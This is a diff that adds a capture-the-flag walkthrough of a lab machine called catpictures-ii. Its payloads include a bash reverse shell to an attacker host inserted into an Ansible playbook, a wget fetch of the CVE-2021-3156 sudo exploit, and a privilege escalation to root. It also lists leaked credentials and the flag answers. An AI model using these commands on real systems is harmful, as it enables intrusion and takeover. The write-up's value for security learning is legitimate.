@@ -227,3 +227,232 @@ Profile Description             : c2
 Profile Copyright               : IX
 Media White Point               : 0.9642 1 0.82491
 Media Black Point               : 0.01205 0.0125 0.01031
+Red Matrix Column               : 0.43607 0.22249 0.01392
+Green Matrix Column             : 0.38515 0.71687 0.09708
+Blue Matrix Column              : 0.14307 0.06061 0.7141
+Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)
+Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)
+Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)
+XMP Toolkit                     : Image::ExifTool 12.49
+Title                           : :8080/764efa883dda1e11db47671c4a3bbd9e.txt
+Image Width                     : 720
+Image Height                    : 1080
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 720x1080
+Megapixels                      : 0.778
+
+http://10.10.183.200:8080/764efa883dda1e11db47671c4a3bbd9e.txt
+
+note to self:
+
+I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
+This file isn't easy to find anyway unless you have the correct url...
+
+gitea: port 3000
+user: samarium
+password: TUmhyZ37CLZrhP
+
+ansible runner (olivetin): port 1337
+
+http://10.10.183.200:3000/samarium/ansible
+
+10d916eaea54bb5ebe36b59538146bb5
+
+http://10.10.183.200:1337/
+
+Run Ansible Playbook
+
+See Logs
+
+Already up to date.
+
+PLAY [Test] ********************************************************************
+
+TASK [Gathering Facts] *********************************************************
+ok: [127.0.0.1]
+
+TASK [get the username running the deploy] *************************************
+ok: [127.0.0.1]
+
+TASK [debug] *******************************************************************
+ok: [127.0.0.1] => {
+    "username_on_the_host": {
+        "changed": false, 
+        "cmd": [
+            "whoami"
+        ], 
+        "delta": "0:00:00.003904", 
+        "end": ".895025", 
+        "failed": false, 
+        "rc": 0, 
+        "start": ".891121", 
+        "stderr": "", 
+        "stderr_lines": [], 
+        "stdout": "bismuth", 
+        "stdout_lines": [
+            "bismuth"
+        ]
+    }
+}
+
+TASK [Test] ********************************************************************
+changed: [127.0.0.1]
+
+PLAY RECAP *********************************************************************
+127.0.0.1                  : ok=4    changed=1    unreachable=0    failed=0   
+
+http://10.10.183.200:3000/samarium/ansible/src/branch/main/playbook.yaml
+
+edit
+
+---
+- name: Test 
+  hosts: all                                  # Define all the hosts
+  remote_user: bismuth
+```
+```text
+- # Defining the Ansible task
+  tasks:             
+    - name: get the username running the deploy
+      become: false
+      command: bash -c "bash -i >& /dev/tcp/10.8.19.103/4444 0>&1"
+      register: username_on_the_host
+      changed_when: false
+
+    - debug: var=username_on_the_host
+
+    - name: Test
+      shell: echo hi
+
+and run playbook from ansible
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvp 4444                                       
+listening on [any] 4444 ...
+10.10.183.200: inverse host lookup failed: Unknown host
+connect to [10.8.19.103] from (UNKNOWN) [10.10.183.200] 40868
+bismuth@catpictures-ii:~$ which python
+which python
+/usr/bin/python
+bismuth@catpictures-ii:~$ python -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/bash")'
+bismuth@catpictures-ii:~$ cd /home
+cd /home
+bismuth@catpictures-ii:/home$ ls
+ls
+bismuth
+bismuth@catpictures-ii:/home$ cd bismuth
+cd bismuth
+bismuth@catpictures-ii:~$ ls
+ls
+flag2.txt
+bismuth@catpictures-ii:~$ cat flag2.txt
+cat flag2.txt
+5e2cafbbf180351702651c09cd797920
+
+bismuth@catpictures-ii:/tmp$ cat /etc/*release
+cat /etc/*release
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=18.04
+DISTRIB_CODENAME=bionic
+DISTRIB_DESCRIPTION="Ubuntu 18.04.6 LTS"
+NAME="Ubuntu"
+VERSION="18.04.6 LTS (Bionic Beaver)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 18.04.6 LTS"
+VERSION_ID="18.04"
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+VERSION_CODENAME=bionic
+UBUNTU_CODENAME=bionic
+
+┌──(witty㉿kali)-[~/Downloads/blasty/CVE-2021-3156-main]
+└─$ ls
+brute.sh  lib.c     Makefile   sudo-hax-me-a-sandwich
+hax.c     libnss_X  README.md
+
+┌──(witty㉿kali)-[~/Downloads/blasty]
+└─$ tar -cvf exploit.tar CVE-2021-3156-main
+CVE-2021-3156-main/
+CVE-2021-3156-main/libnss_X/
+CVE-2021-3156-main/libnss_X/P0P_SH3LLZ_ .so.2
+CVE-2021-3156-main/exploit.tar
+CVE-2021-3156-main/sudo-hax-me-a-sandwich
+CVE-2021-3156-main/README.md
+CVE-2021-3156-main/lib.c
+CVE-2021-3156-main/brute.sh
+CVE-2021-3156-main/Makefile
+CVE-2021-3156-main/hax.c
+                                                                            
+┌──(witty㉿kali)-[~/Downloads/blasty]
+└─$ ls
+CVE-2021-3156-main  exploit.tar
+
+bismuth@catpictures-ii:/tmp$ wget http://10.8.19.103:1234/exploit.tar
+wget http://10.8.19.103:1234/exploit.tar
+--2023-07-03 16:45:21--  http://10.8.19.103:1234/exploit.tar
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 61440 (60K) [application/x-tar]
+Saving to: ‘exploit.tar’
+
+exploit.tar         100%[===================>]  60.00K   161KB/s    in 0.4s    
+
+2023-07-03 16:45:22 (161 KB/s) - ‘exploit.tar’ saved [61440/61440]
+
+┌──(witty㉿kali)-[~/Downloads/blasty]
+└─$ python3 -m http.server 1234            
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.183.200 - - [03/Jul/2023 19:45:16] "GET /exploit.tar HTTP/1.1" 200 -
+
+bismuth@catpictures-ii:/tmp$ tar xopf exploit.tar
+tar xopf exploit.tar
+
+bismuth@catpictures-ii:/tmp$ cd CVE-2021-3156-main
+cd CVE-2021-3156-main
+bismuth@catpictures-ii:/tmp/CVE-2021-3156-main$ make
+make
+rm -rf libnss_X
+mkdir libnss_X
+gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
+gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
+bismuth@catpictures-ii:/tmp/CVE-2021-3156-main$ ./sudo-hax-me-a-sandwich 0
+./sudo-hax-me-a-sandwich 0
+
+** CVE-2021-3156 PoC by blasty <peter@haxx.in>
+
+using target: Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
+** pray for your rootshell.. **
+[+] bl1ng bl1ng! We got it!
+```
+```text
+- # cd /root
+cd /root
+```
+```text
+- # ls
+ls
+ansible  docker-compose.yaml  flag3.txt  gitea
+```
+```text
+- # cat flag3.txt
+cat flag3.txt
+6d2a9f8f8174e86e27d565087a28a971
+```
+- What is Flag 1?
+- *10d916eaea54bb5ebe36b59538146bb5*
+- What is Flag 2?
+- Ansible!
+- *5e2cafbbf180351702651c09cd797920*
+- What is Flag 3?
+- *6d2a9f8f8174e86e27d565087a28a971*
+
+## Notes / Lessons Learned
+[[Theseus]]
+
